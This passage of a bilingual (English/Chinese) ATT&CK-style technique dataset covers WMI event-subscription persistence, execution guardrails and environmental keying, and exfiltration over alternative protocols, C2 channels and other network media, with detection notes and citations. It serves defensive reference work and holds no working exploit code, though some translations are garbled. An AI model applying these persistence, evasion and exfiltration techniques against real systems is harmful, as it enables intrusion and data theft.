文件在会话结束时执行恶意命令。对于 macOS，此技术的功能类似，但可能会利用 zsh，这是 macOS 10.15+ 的默认 shell。当 Terminal.app 打开时，应用程序会启动一个 zsh 登录 shell 和一个 zsh 交互式 shell。登录 shell 使用 <code>/etc/profile</code>、<code>/etc/zshenv</code>、<code>/etc/zprofile</code> 和 <code>/etc 配置系统环境/zlogin</code>.(Citation: ScriptingOSX zsh)(Citation: PersistentJXA_leopitt)(Citation: code_persistence_zsh)(Citation: macOS MS office sandbox escape) 然后登录 shell 使用 <code>~/.zprofile</代码> 和 <code>~/.zlogin</code>。交互式 shell 使用 <code>~/.zshrc</code> 来配置用户环境。退出时，将执行 <code>/etc/zlogout</code> 和 <code>~/.zlogout</code>。对于遗留程序，macOS 在启动时执行 <code>/etc/bashrc</code>。
T1546.003,Event Triggered Execution: Windows Management Instrumentation Event Subscription,"Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Examples of events that may be subscribed to are the wall clock time, user loging, or the computer's uptime.(Citation: Mandiant M-Trends 2015)

Adversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system.(Citation: FireEye WMI SANS 2015)(Citation: FireEye WMI 2015) Adversaries may also compile WMI scripts into Windows Management Object (MOF) files (.mof extension) that can be used to create a malicious subscription.(Citation: Dell WMI Persistence)(Citation: Microsoft MOF May 2018)

WMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus may result in elevated SYSTEM privileges.",https://attack.mitre.org/techniques/T1546/003,24 January 2020,20 April 2022,1.2,"Persistence, Privilege Escalation","Monitor WMI event subscription entries, comparing current WMI event subscriptions to known good subscriptions for each host. Tools such as Sysinternals Autoruns may also be used to detect WMI changes that could be attempts at persistence.(Citation: TechNet Autoruns)(Citation: Medium Detecting WMI Persistence) Monitor for the creation of new WMI <code>EventFilter</code>, <code>EventConsumer</code>, and <code>FilterToConsumerBinding</code> events. Event ID 5861 is logged on Windows 10 systems when new <code>EventFilterToConsumerBinding</code> events are created.(Citation: Elastic - Hunting for Persistence Part 1)

Monitor processes and command-line arguments that can be used to register WMI persistence, such as the <code> Register-WmiEvent</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlet, as well as those that result from the execution of subscriptions (i.e. spawning from the WmiPrvSe.exe WMI Provider Host process).(Citation: Microsoft Register-WmiEvent)",Windows,"Command: Command Execution, Process: Process Creation, WMI: WMI Creation",True,T1546,,"Brent Murphy, Elastic; David French, Elastic","Administrator, SYSTEM",,,,,,"(Citation: FireEye WMI 2015),(Citation: Microsoft 365 Defender Solorigate),(Citation: Bitdefender FIN8 July 2021),(Citation: Microsoft Holmium June 2020),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: CrowdStrike StellarParticle January 2022),(Citation: Microsoft PLATINUM April 2016),(Citation: FireEye POSHSPY April 2017),(Citation: FireEye APT33 Guardrail),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: Mandiant No Easy Breach),(Citation: ESET Turla PowerShell May 2019),(Citation: FireEye Periscope March 2018),(Citation: Secureworks BRONZE PRESIDENT December 2019),(Citation: RedCanary Mockingbird May 2020),(Citation: ESET Dukes October 2019),(Citation: GitHub PoshC2),(Citation: win10_asr),(Citation: FireEye WMI 2015)",事件触发执行：Windows Management Instrumentation(WMI) 事件订阅,攻击者可以通过执行由 Windows Management Instrumentation (WMI) 事件订阅触发的恶意内容来建立持久性并提升特权。 WMI 可用于安装事件过滤器、提供程序、消费者和在定义的事件发生时执行代码的绑定。可以订阅的事件示例包括挂钟时间、用户登录或计算机的正常运行时间。（引用：Mandiant M-Trends 2015）攻击者可以使用 WMI 的功能来订阅事件并在该事件发生时执行任意代码（引用：FireEye WMI SANS 2015）（引用：FireEye WMI 2015）攻击者也可能将 WMI 脚本编译为 Windows 管理对象 (MOF) 文件（扩展名为 .mof），该文件可用于创建恶意订阅。（引用：Dell WMI Persistence）（引用：Microsoft MOF 2018 年 5 月）WMI 订阅执行由 WMI 提供程序主机进程 (WmiPrvSe.exe) 代理，因此可能会导致提升的 SYSTEM 权限。
T1480,Execution Guardrails,"Adversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target. Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversary’s campaign.(Citation: FireEye Kevin Mandia Guardrails) Values an adversary can provide about a target system or environment to use as guardrails may include specific network share names, attached physical devices, files, joined Active Directory (AD) domains, and local/external IP addresses.(Citation: FireEye Outlook Dec 2019)

Guardrails can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This use of guardrails is distinct from typical [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497). While use of [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) may involve checking for known sandbox values and continuing with execution only if there is no match, the use of guardrails will involve checking for an expected target-specific value and only continuing with execution if there is such a match.",https://attack.mitre.org/techniques/T1480,31 January 2019,03 May 2022,1.1,Defense Evasion,"Detecting the use of guardrails may be difficult depending on the implementation. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of [Discovery](https://attack.mitre.org/tactics/TA0007), especially in a short period of time, may aid in detection.","Linux, Windows, macOS","Command: Command Execution, Process: Process Creation",False,,"Anti-virus, Host Forensic Analysis, Signature-based Detection, Static File Analysis","Nick Carr, Mandiant",,,,,,,"(Citation: Cyberreason Anchor December 2019),(Citation: Symantec W.32 Stuxnet Dossier),(Citation: Crowdstrike Indrik November 2018),(Citation: CrowdStrike SUNSPOT Implant January 2021),(Citation: SentinelOne NobleBaron June 2021),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: NCSC GCHQ Small Sieve Jan 2022),(Citation: McAfee Lazarus Nov 2020),",执行限定/执行Guardrails/执行护栏,攻击者可以使用执行Guardrails来根据攻击者提供的和预期将出现在目标上的环境特定条件来限制执行或动作。Guardrails确保有效载荷仅针对预期目标执行，并减少对手活动造成的附带损害。（引文：FireEye Kevin Mandia 护栏）对手可以提供的关于目标系统或环境用作Guardrails的值可能包括特定的网络共享名称，附加的物理设备、文件、加入的 Active Directory (AD) 域和本地/外部 IP 地址。（引用：FireEye Outlook 2019 年 12 月）Guardrails可用于防止在不打算在其中受到损害或操作的环境中暴露功能.这种Guardrails的使用不同于典型的 [虚拟化/沙盒规避](https://attack.mitre.org/techniques/T1497)。虽然使用 [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) 可能涉及检查已知沙箱值并仅在不匹配时继续执行，但使用防护栏将涉及检查一个预期的特定于目标的值，并且只有在存在这样的匹配时才继续执行。
T1480.001,Execution Guardrails: Environmental Keying,"Adversaries may environmentally key payloads or other features of malware to evade defenses and constraint execution to a specific target environment. Environmental keying uses cryptography to constrain execution or actions based on adversary supplied environment specific conditions that are expected to be present on the target. Environmental keying is an implementation of [Execution Guardrails](https://attack.mitre.org/techniques/T1480) that utilizes cryptographic techniques for deriving encryption/decryption keys from specific types of values in a given computing environment.(Citation: EK Clueless Agents)

Values can be derived from target-specific elements and used to generate a decryption key for an encrypted payload. Target-specific values can be derived from specific network shares, physical devices, software/software versions, files, joined AD domains, system time, and local/external IP addresses.(Citation: Kaspersky Gauss Whitepaper)(Citation: Proofpoint Router Malvertising)(Citation: EK Impeding Malware Analysis)(Citation: Environmental Keyed HTA)(Citation: Ebowla: Genetic Malware) By generating the decryption keys from target-specific environmental values, environmental keying can make sandbox detection, anti-virus detection, crowdsourcing of information, and reverse engineering difficult.(Citation: Kaspersky Gauss Whitepaper)(Citation: Ebowla: Genetic Malware) These difficulties can slow down the incident response process and help adversaries hide their tactics, techniques, and procedures (TTPs).

Similar to [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027), adversaries may use environmental keying to help protect their TTPs and evade detection. Environmental keying may be used to deliver an encrypted payload to the target that will use target-specific values to decrypt the payload before execution.(Citation: Kaspersky Gauss Whitepaper)(Citation: EK Impeding Malware Analysis)(Citation: Environmental Keyed HTA)(Citation: Ebowla: Genetic Malware)(Citation: Demiguise Guardrail Router Logo) By utilizing target-specific values to decrypt the payload the adversary can avoid packaging the decryption key with the payload or sending it over a potentially monitored network connection. Depending on the technique for gathering target-specific values, reverse engineering of the encrypted payload can be exceptionally difficult.(Citation: Kaspersky Gauss Whitepaper) This can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within.

Like other [Execution Guardrails](https://attack.mitre.org/techniques/T1480), environmental keying can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This activity is distinct from typical [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497). While use of [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) may involve checking for known sandbox values and continuing with execution only if there is no match, the use of environmental keying will involve checking for an expected target-specific value that must match for decryption and subsequent execution to be successful.",https://attack.mitre.org/techniques/T1480/001,23 June 2020,04 May 2022,1.0,Defense Evasion,"Detecting the use of environmental keying may be difficult depending on the implementation. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of [Discovery](https://attack.mitre.org/tactics/TA0007), especially in a short period of time, may aid in detection.","Linux, Windows, macOS","Command: Command Execution, Process: Process Creation",True,T1480,"Anti-virus, Host Forensic Analysis, Signature-based Detection, Static File Analysis","Nick Carr, Mandiant",,,,,,,"(Citation: Novetta Winnti April 2015),(Citation: Twitter ItsReallyNick APT41 EK),(Citation: Volexity InkySquid RokRAT August 2021),(Citation: ESET InvisiMole June 2020),(Citation: Kaspersky Gauss Whitepaper),(Citation: Kaspersky Equation QA),(Citation: Microsoft Actinium February 2022),",执行限定/执行Guardrails/执行护栏：环境键控,攻击者可能对恶意软件的关键有效载荷或其他功能进行环境保护，以逃避防御并限制对特定目标环境的执行。环境键控使用密码学来限制基于对手提供的环境特定条件的执行或行动，这些条件预计会出现在目标上。环境键控是 [Execution Guardrails](https://attack.mitre.org/techniques/T1480) 的一种实现，它利用加密技术从给定计算环境中的特定类型的值中获取加密/解密密钥。（引用：EK Clueless Agents) 值可以从特定于目标的元素中导出，并用于为加密的有效负载生成解密密钥。目标特定值可以来自特定网络共享、物理设备、软件/软件版本、文件、加入的 AD 域、系统时间和本地/外部 IP 地址。（引用：Kaspersky Gauss Whitepaper）（引用：Proofpoint Router Malvertising） （引文：EK Impeding Malware Analysis）（引文：Environmental Keyed HTA）（引文：Ebowla：Genetic Malware） 通过从目标特定的环境值生成解密密钥，环境键控可以进行沙箱检测、反病毒检测、信息众包和逆向工程困难。（引用：卡巴斯基高斯白皮书）（引用：埃博拉：遗传恶意软件）这些困难会减慢事件响应过程并帮助对手隐藏他们的策略、技术和程序 (TTP)。与 [混淆文件或信息](https://attack.mitre.org/techniques/T1027) 类似，攻击者可能会使用环境键控来帮助保护他们的 TTP 并逃避检测。环境密钥可用于向目标提供加密的有效负载，该目标将在执行前使用特定于目标的值来解密有效负载。（引用：卡巴斯基高斯白皮书）（引用：EK 阻碍恶意软件分析）（引用：环境密钥 HTA）（引文：Ebowla：遗传恶意软件）（引文：Demiguise Guardrail Router Logo）通过利用特定于目标的值来解密有效负载，攻击者可以避免将解密密钥与有效负载打包或通过可能受监控的网络连接发送。根据收集特定目标值的技术，加密有效负载的逆向工程可能非常困难。（引用：卡巴斯基高斯白皮书）这可用于防止在不打算被破坏或在其中运行的环境中暴露功能.与其他 [Execution Guardrails](https://attack.mitre.org/techniques/T1480) 一样，环境键控可用于防止在不打算被破坏或操作的环境中暴露能力。此活动不同于典型的 [虚拟化/沙盒规避](https://attack.mitre.org/techniques/T1497)。虽然使用 [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) 可能涉及检查已知沙箱值并仅在不匹配时继续执行，但使用环境键控将涉及检查为解密和后续执行成功必须匹配的预期目标特定值。
T1048,Exfiltration Over Alternative Protocol,"Adversaries may steal data by exfiltrating it over a different protocol than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.  

Alternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. Different protocol channels could also include Web services such as cloud storage. Adversaries may also opt to encrypt and/or obfuscate these alternate channels. 

[Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048) can be done using various common operating system utilities such as [Net](https://attack.mitre.org/software/S0039)/SMB or FTP.(Citation: Palo Alto OilRig Oct 2016) On macOS and Linux <code>curl</code> may be used to invoke protocols such as HTTP/S or FTP/S to exfiltrate data from a system.(Citation: 20 macOS Common Tools and Techniques) ",https://attack.mitre.org/techniques/T1048,31 May 2017,15 October 2021,1.3,Exfiltration,"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)","Linux, Windows, macOS","Command: Command Execution, File: File Access, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",False,,,Alfredo Abarca; William Cain,,,,,,,"(Citation: SentinelOne FrameworkPOS September 2019),(Citation: Cybereason Chaes Nov 2020),(Citation: ESET Kobalos Feb 2021),(Citation: Symantec Hydraq Jan 2010),(Citation: Cisco Talos Intelligence Group),(Citation: 20 macOS Common Tools and Techniques),(Citation: Talos PoetRAT April 2020),(Citation: TechNet Firewall Design)",通过替代协议进行窃取/协议混淆,攻击者可能会通过与现有命令和控制通道不同的协议窃取数据来窃取数据。数据也可以从主命令和控制服务器发送到备用网络位置。替代协议包括 FTP、SMTP、HTTP/S、DNS、SMB 或任何其他不用作主要命令和控制通道的网络协议。不同的协议通道还可以包括云存储等 Web 服务。攻击者也可能选择加密和/或混淆这些备用通道。 [通过替代协议进行渗透](https://attack.mitre.org/techniques/T1048) 可以使用各种常见的操作系统实用程序来完成，例如 [Net](https://attack.mitre.org/software/S0039) /SMB 或 FTP。（引用：Palo Alto OilRig Oct 2016）在 macOS 和 Linux 上，<code>curl</code> 可用于调用 HTTP/S 或 FTP/S 等协议以从系统中窃取数据。（引用: 20 个 macOS 常用工具和技术)
T1048.002,Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol,"Adversaries may steal data by exfiltrating it over an asymmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. 

Asymmetric encryption algorithms are those that use different keys on each end of the channel. Also known as public-key cryptography, this requires pairs of cryptographic keys that can encrypt/decrypt data from the corresponding key. Each end of the communication channels requires a private key (only in the procession of that entity) and the public key of the other entity. The public keys of each entity are exchanged before encrypted communications begin. 

Network protocols that use asymmetric encryption (such as HTTPS/TLS/SSL) often utilize symmetric encryption once keys are exchanged. Adversaries may opt to use these encrypted mechanisms that are baked into a protocol. ",https://attack.mitre.org/techniques/T1048/002,15 March 2020,15 October 2021,1.1,Exfiltration,"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.(Citation: University of Birmingham C2) ","Linux, Windows, macOS","Command: Command Execution, File: File Access, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",True,T1048,,William Cain,,,,,,,"(Citation: Volexity SolarWinds),(Citation: Rclone),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: TechNet Firewall Design)",通过替代协议进行窃取/协议混淆：非对称加密非 C2 协议的泄露,攻击者可能会通过非对称加密网络协议窃取数据，而不是现有的命令和控制通道。数据也可以从主命令和控制服务器发送到备用网络位置。非对称加密算法是在通道的每一端使用不同密钥的算法。也称为公钥加密，这需要成对的加密密钥，可以加密/解密来自相应密钥的数据。通信通道的每一端都需要一个私钥（仅在该实体的进程中）和另一个实体的公钥。在加密通信开始之前交换每个实体的公钥。使用非对称加密的网络协议（例如 HTTPS/TLS/SSL）通常在交换密钥后使用对称加密。攻击者可能会选择使用这些嵌入协议的加密机制。
T1048.001,Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol,"Adversaries may steal data by exfiltrating it over a symmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. 

Symmetric encryption algorithms are those that use shared or the same keys/secrets on each end of the channel. This requires an exchange or pre-arranged agreement/possession of the value used to encrypt and decrypt data. 

Network protocols that use asymmetric encryption often utilize symmetric encryption once keys are exchanged, but adversaries may opt to manually share keys and implement symmetric cryptographic algorithms (ex: RC4, AES) vice using mechanisms that are baked into a protocol. This may result in multiple layers of encryption (in protocols that are natively encrypted such as HTTPS) or encryption in protocols that not typically encrypted (such as HTTP or FTP). ",https://attack.mitre.org/techniques/T1048/001,15 March 2020,28 March 2020,1.0,Exfiltration,"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.(Citation: University of Birmingham C2) 

Artifacts and evidence of symmetric key exchange may be recoverable by analyzing network traffic or looking for hard-coded values within malware. If recovered, these keys can be used to decrypt network data from command and control channels. ","Linux, Windows, macOS","Command: Command Execution, File: File Access, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",True,T1048,,,,,,,,,",(Citation: TechNet Firewall Design)",通过替代协议进行窃取/协议混淆：对称加密非 C2 协议的渗透,攻击者可以通过对称加密的网络协议而不是现有的命令和控制通道来窃取数据。数据也可以从主命令和控制服务器发送到备用网络位置。对称加密算法是那些在通道的每一端使用共享或相同密钥/秘密的算法。这需要交换或预先安排协议/拥有用于加密和解密数据的值。使用非对称加密的网络协议通常在交换密钥后使用对称加密，但攻击者可能会选择手动共享密钥并使用协议中的机制来实施对称加密算法（例如：RC4、AES）。这可能会导致多层加密（在本机加密的协议中，例如 HTTPS）或在通常不加密的协议中加密（例如 HTTP 或 FTP）。
T1048.003,Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol,"Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. 

Adversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS). This may include custom or publicly available encoding/compression algorithms (such as base64) as well as embedding data within protocol headers and fields. ",https://attack.mitre.org/techniques/T1048/003,15 March 2020,12 April 2022,2.0,Exfiltration,"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2) ","Linux, Windows, macOS","Command: Command Execution, File: File Access, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",True,T1048,,William Cain,,,,,,,"(Citation: Microsoft FTP),(Citation: Medium KONNI Jan 2020),(Citation: Symantec Thrip June 2018),(Citation: Symantec Elfin Mar 2019),(Citation: Unit42 CookieMiner Jan 2019),(Citation: F-Secure Cosmicduke),(Citation: DFIR Ryuk's Return October 2020),(Citation: hexed osx.dok analysis 2019),(Citation: Rclone),(Citation: Novetta Blockbuster RATs),(Citation: SentinelLabs Agent Tesla Aug 2020),(Citation: Linux FTP),(Citation: McAfee Gold Dragon),(Citation: ESET OceanLotus Mar 2019),(Citation: Check Point APT35 CharmPower January 2022),(Citation: Trustwave Cherry Picker),(Citation: Trend Micro FIN6 October 2019),(Citation: Microsoft BITSAdmin),(Citation: Novetta Blockbuster),(Citation: ESET Carbon Mar 2017),(Citation: Talos Agent Tesla Oct 2018),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: objective-see windtail2 jan 2019),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: ESET ForSSHe December 2018),(Citation: Kaspersky ProjectSauron Full Report),(Citation: DFIR Ryuk 2 Hour Speed Run November 2020),(Citation: Bitdefender Agent Tesla April 2020),(Citation: FireEye APT37 Feb 2018),(Citation: Talos PoetRAT April 2020),(Citation: Palo Alto OilRig Oct 2016),(Citation: TechNet Firewall Design)",通过替代协议进行窃取/协议混淆：通过未加密的非 C2 协议进行渗透,攻击者可以通过未加密的网络协议而不是现有的命令和控制通道来窃取数据。数据也可以从主命令和控制服务器发送到备用网络位置。攻击者可能会选择在本机未加密的网络协议（例如 HTTP、FTP 或 DNS）中混淆这些数据，而不使用加密。这可能包括自定义或公开可用的编码/压缩算法（例如 base64）以及在协议头和字段中嵌入数据。
T1041,Exfiltration Over C2 Channel,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,https://attack.mitre.org/techniques/T1041,31 May 2017,15 October 2021,2.1,Exfiltration,"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)","Linux, Windows, macOS","Command: Command Execution, File: File Access, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",False,,,William Cain,,,,,,,"(Citation: Cyberreason Anchor December 2019),(Citation: Unit 42 MechaFlounder March 2019),(Citation: Cybereason Valak May 2020),(Citation: trendmicro xcsset xcode project 2020),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: McAfee Bankshot),(Citation: Kaspersky Lyceum October 2021),(Citation: FoxIT Wocao December 2019),(Citation: Securelist Octopus Oct 2018),(Citation: ESET Crutch December 2020),(Citation: FireEye Ursnif Nov 2017),(Citation: ESET OceanLotus Mar 2019),(Citation: ESET Sednit Part 2),(Citation: Kaspersky QakBot September 2021),(Citation: Talos Promethium June 2020),(Citation: Bitdefender StrongPity June 2020),(Citation: wardle evilquest partii),(Citation: FireEye Clandestine Fox),(Citation: FSecure Lokibot November 2019),(Citation: Malwarebytes Kimsuky June 2021),(Citation: Malwarebytes KONNI Evolves Jan 2022),(Citation: Novetta Blockbuster),(Citation: Trusteer Carberp October 2010),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: Google EXOTIC LILY March 2022),(Citation: Volexity InkySquid BLUELIGHT August 2021),(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022),(Citation: BlackBerry CostaRicto November 2020),(Citation: Kaspersky TajMahal April 2019),(Citation: ESET ForSSHe December 2018),(Citation: GitHub Sliver Download),(Citation: US-CERT BLINDINGCAN Aug 2020),(Citation: ESET LightNeuron May 2019),(Citation: ProofPoint Ursnif Aug 2016),(Citation: Reaqta MuddyWater November 2017),(Citation: Scarlet Mimic Jan 2016),(Citation: Zscaler Higaisa 2020),(Citation: McAfee Sharpshooter December 2018),(Citation: Trustwave GoldenSpy June 2020),(Citation: Github PowerShell Empire),(Citation: Unit42 Molerat Mar 2020),(Citation: reed thiefquest ransomware analysis),(Citation: Unit 42 Valak July 2020),(Citation: Unit 42 OopsIE! Feb 2018),(Citation: Bitdefender Trickbot VNC module Whitepaper 2021),(Citation: FBI FLASH APT39 September 2020),(Citation: Cybereason StrifeWater Feb 2022),(Citation: Kaspersky Cloud Atlas August 2019),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: Talos Bisonal Mar 2020),(Citation: FireEye SUNSHUTTLE Mar 2021),(Citation: McAfee Lazarus Nov 2020),(Citation: ESET Industroyer),(Citation: Cybereason Kimsuky November 2020),(Citation: QiAnXin APT-C-36 Feb2019),(Citation: Check Point APT35 CharmPower January 2022),(Citation: TrendMicro Ursnif Mar 2015),(Citation: Zscaler Lyceum DnsSystem June 2022),(Citation: NSA/FBI Drovorub August 2020),(Citation: Unit 42 PingPull Jun 2022),(Citation: ESET Okrum July 2019),(Citation: McAfee GhostSecret),(Citation: FireEye HAWKBALL Jun 2019),(Citation: CrowdStrike Grim Spider May 2019),(Citation: BlackBerry Amadey 2020),(Citation: Prevx Carberp March 2011),(Citation: McAfee Honeybee),(Citation: Cybereason Cobalt Kitty 2017),(Citation: ESET Grandoreiro April 2020),(Citation: Talos Konni May 2017),(Citation: Check Point APT34 April 2021),(Citation: US-CERT HOPLIGHT Apr 2019),(Citation: CheckPoint Bandook Nov 2020),(Citation: Malwarebytes Konni Aug 2021),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: Checkpoint IndigoZebra July 2021),(Citation: Cylance Dust Storm),(Citation: Talos ROKRAT),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: Zscaler APT31 Covid-19 October 2020),(Citation: Secureworks REvil September 2019),(Citation: Securelist Kimsuky Sept 2013),(Citation: Mandiant Operation Ke3chang November 2014),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Check Point Warzone Feb 2020),(Citation: Securelist Remexi Jan 2019),(Citation: Mandiant UNC3890 Aug 2022),(Citation: ZScaler Squirrelwaffle Sep 2021),(Citation: GitHub Pupy),(Citation: Accenture SNAKEMACKEREL Nov 2018),(Citation: Unit42 Cannon Nov 2018),(Citation: NCSC Cyclops Blink February 2022),(Citation: NHS UK BLINDINGCAN Aug 2020),(Citation: ESET Windigo Mar 2014),(Citation: Palo Alto Gamaredon Feb 2017),(Citation: CrowdStrike IceApple May 2022),(Citation: Cybereason Soft Cell June 2019),(Citation: CISA AppleJeus Feb 2021),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: Trend Micro njRAT 2018),(Citation: FOX-IT May 2016 Mofang),(Citation: Kaspersky MoleRATs April 2019),(Citation: Novetta Blockbuster Loaders),(Citation: Trend Micro Emotet Jan 2019),(Citation: Group IB GrimAgent July 2021),(Citation: Talos Kimsuky Nov 2021),(Citation: ESET Telebots Dec 2016),(Citation: Prevailion EvilNum May 2020),(Citation: Korean FSI TA505 2020),(Citation: NTT Security Flagpro new December 2021),(Citation: FireEye SMOKEDHAM June 2021),(Citation: Kaspersky Tomiris Sep 2021),(Citation: SentinelOne Valak June 2020),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: McAfee Lazarus Resurfaces Feb 2018),(Citation: Symantec W.32 Stuxnet Dossier),(Citation: CISA MAR SLOTHFULMEDIA October 2020),(Citation: TrendMicro Confucius APT Aug 2021),(Citation: ESET DazzleSpy Jan 2022),(Citation: Intezer Doki July 20),(Citation: ESET Gelsemium June 2021),(Citation: FireEye APT30),(Citation: Leonardo Turla Penquin May 2020),(Citation: ClearSky Siamesekitten August 2021),(Citation: Talos Frankenstein June 2019),(Citation: MSTIC FoggyWeb September 2021),(Citation: ESET Machete July 2019),(Citation: Microsoft POLONIUM June 2022),(Citation: Citizen Lab Stealth Falcon May 2016),(Citation: Kaspersky WIRTE November 2021),(Citation: Cybereason Astaroth Feb 2019),(Citation: ESET Casbaneiro Oct 2019),(Citation: CISA AA21-200A APT40 July 2021),(Citation: Unit42 RDAT July 2020),(Citation: Talos PoetRAT October 2020),(Citation: NCC Group Chimera January 2021),(Citation: ESET Attor Oct 2019),(Citation: ClearSky Lebanese Cedar Jan 2021),(Citation: CISA Zebrocy Oct 2020),(Citation: Carbon Black HotCroissant April 2020),(Citation: Malwarebytes Dyreza November 2015),(Citation: University of Birmingham C2)",通过 C2 通道渗透,攻击者可以通过现有的命令和控制通道窃取数据。使用与命令和控制通信相同的协议将窃取的数据编码到正常通信通道中。
T1011,Exfiltration Over Other Network Medium,"Adversaries may attempt to exfiltrate data over a different network medium than the command and control channel. If the command and control network is a wired Internet connection, the exfiltration may occur, for example, over a WiFi connection, modem, cellular data connection, Bluetooth, or another radio frequency (RF) channel.

Adversaries may choose to do this if they have sufficient access or proximity, and the connection might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.",https://attack.mitre.org/techniques/T1011,31 May 2017,08 March 2022,1.1,Exfiltration,"Monitor for processes utilizing the network that do not normally have network communication or have never been seen before. Processes that normally require user-driven events to access the network (for example, a web browser opening with a mouse click or key press) but access the network without such may be malicious.

Monitor for and investigate changes to host adapter settings, such as addition and/or replication of communication interfaces.","Linux, Windows, macOS","Command: Command Execution, File: File Access, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",False,,,"Itzik Kotler, SafeBreach",,,,,,,",(Citation: TechRepublic Wireless GPO FEB 2009),(Citation: Microsoft GPO Bluetooth FEB 2009)",通过其他网络介质进行渗透,攻击者可能会尝试通过与命令和控制通道不同的网络介质来窃取数据。如果命令和控制网络是有线互联网连接，则可以通过例如 WiFi 连接、调制解调器、蜂窝数据连接、蓝牙或其他射频 (RF) 通道进行渗漏。如果攻击者有足够的访问权限或接近度，则攻击者可能会选择这样做，并且连接可能不会像主要的 Internet 连接通道那样受到保护或保护，因为它不是通过同一企业网络路由的。
T1011.001,Exfiltration Over Other Network Medium: Exfiltration Over Bluetooth,"Adversaries may attempt to exfiltrate data over Bluetooth rather than the command and control channel. If the command and control network is a wired Internet connection, an adversary may opt to exfiltrate data using a Bluetooth communication channel.

Adversaries may choose to do this if they have sufficient access and proximity. Bluetooth connections might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.",https://attack.mitre.org/techniques/T1011/001,09 March 2020,08 March 2022,1.1,Exfiltration,"Monitor for processes utilizing the network that do not normally have network communication or have never been seen before. Processes that normally require user-driven events to access the network (for example, a web browser opening with a mouse click or key press) but access the network without such may be malicious.

